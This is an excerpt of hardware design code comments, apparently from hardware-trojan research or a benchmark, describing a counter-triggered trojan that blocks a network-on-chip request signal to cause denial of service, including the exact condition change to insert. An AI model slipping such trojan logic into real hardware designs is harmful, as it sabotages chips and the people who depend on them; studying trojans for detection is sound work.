 ...
 * 
 * Description:
 *   Disables operations by blocking noc_req_t control signal
 *   
 * Trigger: Counter on noc_req_t
 * Payload: Block noc_req_t when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block noc_req_t when trojan is active
//
// IMPORTANT: noc_req_t is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (noc_req_t && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: noc_req_t && 0 = 0 (always false)
//   All operations controlled by noc_req_t are blocked
